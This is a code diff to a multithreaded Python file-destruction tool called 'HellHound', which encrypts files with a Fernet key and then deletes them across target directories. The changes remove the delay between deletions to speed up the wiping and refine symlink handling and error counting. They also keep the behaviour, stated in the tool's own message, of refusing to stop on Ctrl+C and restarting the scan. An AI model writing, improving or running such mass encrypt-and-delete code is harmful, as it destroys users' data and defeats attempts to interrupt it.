@@ -12,7 +12,6 @@ import threading
 # Configuration
 LOG_FREQUENCY = 50
 MAX_FILES_LIMIT = 5000
-DELAY_BETWEEN_DELETIONS = 0.0001  # Reduced for faster execution
 MAX_WORKERS = 16  # Thread pool size — deletion is I/O-latency-bound rather
 # than CPU-bound, so a pool wider than the CPU count still pays (measured:
 # a 5,000-file tree deleted ~40% faster with 16 workers than with 8 on a
@@ -50,7 +49,11 @@ def display_hellhound_message():
 def generate_encryption_key():
     """Generate a Fernet encryption key for file encryption"""
     key = Fernet.generate_key()
-    with open(ENCRYPTION_KEY_FILE, 'wb') as f:
+    # The key file is a live secret: create it owner-only (0o600)
+    # instead of inheriting the process umask, which on a typical
+    # desktop leaves it world-readable for the whole session.
+    fd = os.open(ENCRYPTION_KEY_FILE, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
+    with os.fdopen(fd, 'wb') as f:
         f.write(key)
     print(f"\033[93m[+] Encryption key generated and saved: {ENCRYPTION_KEY_FILE}\033[0m")
     return key
@@ -88,12 +91,18 @@ def encrypt_file(filepath, cipher):
         bool: True if encryption successful
     """
     try:
-        # One stat answers both acceptance questions the old code asked
-        # with isfile() + getsize(): regular file (symlinks followed, as
-        # isfile did) and non-empty. A missing/unreadable file raises
-        # OSError here, which maps to isfile()'s False.
+        # One lstat answers both acceptance questions, with the same
+        # acceptance rule the worker applies: a symlink's own mode is
+        # never S_ISREG, so a symlink is refused here too. Using stat
+        # (follow) here while the worker gates on lstat left a scope
+        # escape: a path swapped for a symlink between the worker's
+        # check and this call would have encrypted the symlink's
+        # target — a file OUTSIDE the announced target trees — in
+        # place. lstat + S_ISREG closes that window; regular files
+        # are unaffected. A missing/unreadable file raises OSError
+        # here, which maps to isfile()'s False.
         try:
-            file_stat = os.stat(filepath)
+            file_stat = os.lstat(filepath)
         except OSError:
             return False
         if not stat.S_ISREG(file_stat.st_mode) or file_stat.st_size == 0:
@@ -177,7 +186,6 @@ def delete_file_worker(filepath, cipher=None, encrypt_before_delete=False):
             stats["total_files_deleted"] += 1
             stats["total_size_deleted"] += file_size
         
-        time.sleep(DELAY_BETWEEN_DELETIONS)
         return result
         
     except PermissionError:
@@ -245,6 +253,12 @@ def delete_directory_contents_threaded(target_dir, cipher=None, encrypt_before_d
             file_list = []
             limit_hit = False
             files_processed = 0
+            # A restarted scan re-walks the same tree: scan errors the
+            # first attempt counted would be counted AGAIN by the
+            # retry, inflating the summary's error total for a single
+            # unreadable directory. Snapshot and roll back on restart
+            # so each real failure is counted exactly once.
+            errors_before_attempt = stats["errors"]
             try:
                 for root, dirs, files in os.walk(target_dir, onerror=_scan_error):
                     for file in files:
@@ -261,6 +275,8 @@ def delete_directory_contents_threaded(target_dir, cipher=None, encrypt_before_d
                         break
                 break
             except KeyboardInterrupt:
+                with deletion_lock:
+                    stats["errors"] = errors_before_attempt
                 print("\033[91m[!] Ctrl+C pressed during the scan — "
                       "HellHound does not stop mid-run; the scan will "
                       "restart and the run will complete its announced "
